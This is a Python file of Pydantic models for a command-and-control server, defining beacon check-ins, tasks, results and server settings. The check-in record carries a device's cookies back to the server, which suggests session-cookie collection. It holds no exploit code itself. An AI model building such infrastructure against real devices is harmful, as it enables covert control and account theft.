"""
Pydantic models for the C2 server.
Defines the data structures exchanged between the server and beacon.
"""

from datetime import datetime, timezone
from typing import Any
from uuid import uuid4

from pydantic import BaseModel, Field


# ---------------------------------------------------------------------------
# Beacon / Device models (server ↔ app)
# ---------------------------------------------------------------------------

class BeaconCheckIn(BaseModel):
    """Payload sent by the beacon app when it checks in."""
    device_name: str
    ip_address: str
    os_info: str = ""
    cookies: dict[str, str] = Field(default_factory=dict)


class DeviceInfo(BaseModel):
    """Internal representation of a managed device."""
    name: str
    ip: str
    status: str = "online"
    os_info: str = ""
    last_seen: datetime = Field(
        default_factory=lambda: datetime.now(timezone.utc)
    )
    cookies: dict[str, str] = Field(default_factory=dict)


class TaskResponse(BaseModel):
    """A task returned to the beacon when it polls for work."""
    task_id: str = Field(default_factory=lambda: str(uuid4()))
    task_type: str
    parameters: dict[str, Any] = Field(default_factory=dict)


class TaskResult(BaseModel):
    """Result submitted by the beacon after completing a task."""
    task_id: str
    device_name: str
    success: bool
    data: dict[str, Any] = Field(default_factory=dict)


class ServerConfig(BaseModel):
    """Current server operational configuration."""
    beacon_interval: int = 2
    communication_protocol: str = "https"
